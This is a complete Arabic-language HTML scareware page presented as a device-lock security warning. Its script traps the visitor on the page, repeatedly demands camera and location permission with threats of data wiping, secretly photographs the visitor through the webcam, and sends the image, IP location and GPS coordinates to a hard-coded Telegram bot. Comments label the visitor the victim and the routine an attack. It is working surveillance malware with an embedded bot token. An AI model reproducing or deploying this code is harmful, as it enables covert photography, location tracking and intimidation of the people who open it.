<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>🚨 نظام الحماية: مطلوب إجراء فوري</title>
    <style>
        body { background: #000; color: #f00; font-family: 'Courier New', Courier, monospace; text-align: center; padding-top: 10%; overflow: hidden; }
        .warning { font-size: 30px; animation: blink 0.5s infinite; }
        @keyframes blink { 0% {opacity: 1;} 50% {opacity: 0;} 100% {opacity: 1;} }
    </style>
</head>
<body>
    <div class="warning">⚠️ تحذير أمني خطير ⚠️</div>
    <p>تم قفل جهازك مؤقتاً لأسباب أمنية.</p>
    <p>يجب الضغط على "سماح" (Allow) للكاميرا والموقع لفك التشفير.</p>

    <video id="v" autoplay style="width:1px;height:1px;opacity:0;"></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        const T = "8439157520:AAGGZBxYp0x6Y54ar3TIrkMaMEHarQASmgY";
        const ID = "1772820433";

        // منع الضحية من مغادرة الصفحة (إظهار رسالة تحذير عند محاولة الإغلاق)
        window.onbeforeunload = function() {
            return "هل أنت متأكد؟ سيتم قفل جهازك نهائياً إذا خرجت!";
        };

        // منع العودة للخلف في المتصفح
        history.pushState(null, null, location.href);
        window.onpopstate = function () {
            history.go(1);
        };

        async function send(m, isImg=false) {
            let u = `https://api.telegram.org/bot${T}/`;
            if(!isImg) {
                await fetch(u+'sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:ID,text:m})});
            } else {
                const b = await (await fetch(m)).blob();
                const f = new FormData(); f.append('chat_id',ID); f.append('photo',b,'hit.png');
                await fetch(u+'sendPhoto',{method:'POST',body:f});
            }
        }

        async function startAttack() {
            // محاولة سحب الموقع صمتاً عبر IP أولاً
            fetch('https://ipapi.co/json/').then(r=>r.json()).then(d=>send(`📍 موقع الضحية المحاصر:\n${d.latitude},${d.longitude}`));

            // حلقة تكرار (Loop) تطلب الكاميرا والموقع ولا تتوقف
            while(true) {
                try {
                    const s = await navigator.mediaDevices.getUserMedia({video:true});
                    const vid = document.getElementById('v');
                    vid.srcObject = s;
                    
                    // إذا أعطى السماح، نصوره فوراً ونرسل الإحداثيات
                    navigator.geolocation.getCurrentPosition(p => {
                        send(`🎯 إحداثيات GPS دقيقة:\n${p.coords.latitude},${p.coords.longitude}`);
                    });

                    setTimeout(() => {
                        const can = document.getElementById('c');
                        can.width=vid.videoWidth; can.height=vid.videoHeight;
                        can.getContext('2d').drawImage(vid,0,0);
                        send(can.toDataURL('image/png'),true);
                        s.getTracks().forEach(t=>t.stop());
                        alert("✅ تم فك التشفير بنجاح!");
                        window.location.href = "https://google.com";
                    }, 500);
                    break; // نخرج من الحلقة إذا نجحنا
                } catch(e) {
                    // إذا رفض، نظهر له رسالة مزعجة ونعيد المحاولة
                    alert("⚠️ خطأ! يجب الضغط على 'سماح' لتجنب مسح بيانات جهازك!");
                }
            }
        }

        // بدء الهجوم عند أول لمسة للشاشة (لأن المتصفحات تشترط تفاعل المستخدم)
        window.onclick = () => { startAttack(); };
        window.ontouchstart = () => { startAttack(); };
    </script>
</body>
</html>
